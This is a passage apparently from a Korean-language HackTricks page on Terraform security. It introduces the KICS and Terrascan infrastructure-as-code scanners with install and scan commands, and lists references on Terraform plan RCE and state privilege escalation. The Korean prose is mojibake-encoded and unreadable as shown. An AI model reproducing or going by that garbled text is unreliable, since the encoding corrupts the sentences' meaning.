**KICS**ëŠ” **K**eeping **I**nfrastructure as **C**ode **S**ecureì˜ ì•½ìë¡œ, ì˜¤í”ˆ ì†ŒìŠ¤ì´ë©° ëª¨ë“  í´ë¼ìš°ë“œ ë„¤ì´í‹°ë¸Œ í”„ë¡œì íŠ¸ì— í•„ìˆ˜ì…ë‹ˆë‹¤.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

From the [**docs**](https://github.com/tenable/terrascan): Terrascanì€ ì½”ë“œë¡œì„œì˜ ì¸í”„ë¼ë¥¼ ìœ„í•œ ì •ì  ì½”ë“œ ë¶„ì„ê¸°ì…ë‹ˆë‹¤. Terrascanì„ ì‚¬ìš©í•˜ë©´ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- ì˜ëª»ëœ êµ¬ì„±ì„ ìœ„í•´ ì½”ë“œë¡œì„œì˜ ì¸í”„ë¼ë¥¼ ì›í™œí•˜ê²Œ ìŠ¤ìº”í•©ë‹ˆë‹¤.
- êµ¬ì„± ë³€ê²½ìœ¼ë¡œ ì¸í•œ í¬ì§€ì…˜ ë“œë¦¬í”„íŠ¸ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ê³ , ì•ˆì „í•œ í¬ì§€ì…˜ìœ¼ë¡œ ë˜ëŒë¦´ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
- ë³´ì•ˆ ì·¨ì•½ì  ë° ê·œì • ì¤€ìˆ˜ ìœ„ë°˜ì„ ê°ì§€í•©ë‹ˆë‹¤.
- í´ë¼ìš°ë“œ ë„¤ì´í‹°ë¸Œ ì¸í”„ë¼ë¥¼ í”„ë¡œë¹„ì €ë‹í•˜ê¸° ì „ì— ìœ„í—˜ì„ ì™„í™”í•©ë‹ˆë‹¤.
- ë¡œì»¬ì—ì„œ ì‹¤í–‰í•˜ê±°ë‚˜ CI\CDì™€ í†µí•©í•  ìˆ˜ ìˆëŠ” ìœ ì—°ì„±ì„ ì œê³µí•©ë‹ˆë‹¤.
```bash
brew install terrascan
```
## References

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{{#include ../banners/hacktricks-training.md}}
